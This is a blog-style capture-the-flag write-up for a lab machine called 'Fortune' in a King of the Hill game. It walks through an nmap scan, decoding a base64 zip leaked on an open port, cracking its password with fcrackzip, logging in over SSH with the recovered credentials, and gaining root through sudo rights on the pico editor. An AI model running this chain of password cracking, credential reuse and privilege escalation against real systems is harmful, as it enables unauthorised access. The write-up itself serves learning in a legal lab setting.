# NOTE: This was a blog from *vipin.xyz* see [this](https://www.vipin.xyz/blog/archive)

# Fortune | KOTH Writeup 

A Concise KOTH Writeup.

Released: 2024-04-15

## NMAP

- I used `sudo nmap -sV -sC 10.10.148.32` for my scan.

```bash
┌──(vipin㉿vipin)-[~]
└─$ sudo nmap -sV -sC 10.10.148.32 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-14 15:40 EDT
Nmap scan report for 10.10.148.32
Host is up (0.092s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3e:ae:18:87:b8:c3:35:b6:3a:af:0e:a4:c3:a2:ef:13 (RSA)
|   256 42:cf:fe:0d:cb:92:24:b9:8f:dc:11:d4:10:a7:a0:3e (ECDSA)
|_  256 5c:fc:bc:c9:3a:01:b1:b6:78:ac:66:3c:34:8f:22:2a (ED25519)
80/tcp   open  http       Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wheel of Fortune!
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
111/tcp  open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      43991/tcp   mountd
|   100005  1,2,3      51188/udp   mountd
|   100005  1,2,3      53990/udp6  mountd
|   100005  1,2,3      54207/tcp6  mountd
|   100021  1,3,4      38116/udp   nlockmgr
|   100021  1,3,4      38145/tcp   nlockmgr
|   100021  1,3,4      39708/udp6  nlockmgr
|   100021  1,3,4      45597/tcp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs        3-4 (RPC #100003)
3333/tcp open  dec-notes?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, JavaRMI, LPDString, NULL, kumo-server: 
|     UEsDBAoACQAAAFSjjliKv3GtHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAAPwLRxm8C0cZnV4CwAB
|     BAAAAAAEAAAAAOjukMXnRaL/b0hG/sRdaxmEI1JLOfuZYAbRbHKk9xNQSwcIir9xrR8AAAATAAAA
|     UEsBAh4DCgAJAAAAVKOOWIq/ca0fAAAAEwAAAAkAGAAAAAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVU
|_    BQAD8C0cZnV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AAAByAAAAAAA=
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.90 seconds
```

## Getting User

- Dirsearch gave us nothing.

- If we look at the NMAP Scan, on port 3333 we see this…

```bash
3333/tcp open  dec-notes?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, JavaRMI, LPDString, NULL, kumo-server: 
|     UEsDBAoACQAAAFSjjliKv3GtHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAAPwLRxm8C0cZnV4CwAB
|     BAAAAAAEAAAAAOjukMXnRaL/b0hG/sRdaxmEI1JLOfuZYAbRbHKk9xNQSwcIir9xrR8AAAATAAAA
|     UEsBAh4DCgAJAAAAVKOOWIq/ca0fAAAAEwAAAAkAGAAAAAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVU
|_    BQAD8C0cZnV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AAAByAAAAAAA=
9999/tcp open  http       Werkzeug httpd 1.0.1 (Python 3.6.9)
```

- After extracting the Base64 string and pasting it into Cyberchef, it tells us it is a PKZIP.

![Image showing pkzip](blog/fortune/pkzip.png 'Fig.1')
<div style={{ textAlign: 'center' }}>
  <small>Fig.1</small>
</div>

- Let's see what's inside.

```bash
┌──(vipin㉿vipin)-[~/Desktop]
└─$ echo 'UEsDBAoACQAAAFSjjliKv3GtHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAAPwLRxm8C0cZnV4CwABBAAAAAAEAAAAAOjukMXnRaL/b0hG/sRdaxmEI1JLOfuZYAbRbHKk9xNQSwcIir9xrR8AAAATAAAAUEsBAh4DCgAJAAAAVKOOWIq/ca0fAAAAEwAAAAkAGAAAAAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVUBQAD8C0cZnV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AAAByAAAAAAA=' | base64 -d > cred.zip
┌──(vipin㉿vipin)-[~/Desktop]
└─$ unzip cred.zip
Archive:  cred.zip
[cred.zip] creds.txt password: 
```

- It seems password-protected. I will crack it with *fcrackzip* (A ZIP cracking tool).

```bash
┌──(vipin㉿vipin)-[~/Desktop]
└─$ fcrackzip -u -D -p  /usr/share/wordlists/rockyou.txt /home/vipin/Desktop/cred.zip


PASSWORD FOUND!!!!: pw == peaceout
```

- Now that we have the password, we can unzip the file.

```bash
┌──(vipin㉿vipin)-[~/Desktop]
└─$ unzip cred.zip
Archive:  cred.zip
[cred.zip] creds.txt password: 
 extracting: creds.txt               
                                                                                                       
┌──(vipin㉿vipin)-[~/Desktop]
└─$ cat creds.txt 
fortuna:MGE0OTJiM2
```

- It seems to be credentials to the user *fortuna*.

```bash
┌──(vipin㉿vipin)-[~/Desktop]
└─$ ssh fortuna@$IP               
The authenticity of host '10.10.148.32 (10.10.148.32)' can't be established.
ED25519 key fingerprint is SHA256:UlktbYjOEgkrcijQ2e1j4iJ3u9hj8b2xzTtKJE5YTIw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.148.32' (ED25519) to the list of known hosts.
fortuna@10.10.148.32's password: 



        ################################
        ###  Come to try your luck?  ###
        ### Welcome to your fortune! ###
        ################################

```

- The credentials worked!

## Rooting the machine

- I started by running `sudo -l` which tells us what the user can use sudo for.

```bash
fortuna@fortune:~$ sudo -l
[sudo] password for fortuna: 
Matching Defaults entries for fortuna on fortune:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fortuna may run the following commands on fortune:
    (ALL : ALL) /usr/bin/pico
```

> What is pico?

- **Pico** is a text editor like **Nano** and **Vim**.

- Lets see how we can utilize it to get root, we will be using [gtfobins](https://gtfobins.github.io/gtfobins/pico/) to do this.

![Image showing gtfobin pico](blog/fortune/gtfobinpico.png 'Fig.2')
<div style={{ textAlign: 'center' }}>
  <small>Fig.1 *GTFObins*</small>
</div>


- And it worked! (I forgot to take an image of it 😢)

- Once I got root, I spawned a PTY with `python -c'import pty; pty.spawn("/bin/bash")'`

- After I got root, I put my name in the king's file to get points every minute.

```bash
root@fortune:/root# ls
flagtips.txt  king.txt
root@fortune:/root# cat flagtips.txt
Some flags are flags, some flags are games.
Good luck!
root@fortune:/root# echo 'vipin.b' > king.txt 
root@fortune:/root# cat king.txt
vipin.b
root@fortune:/root# 
```

- It seems like there isn’t a root flag. At least we rooted the machine!

### MACHINE PWN'ED 😎

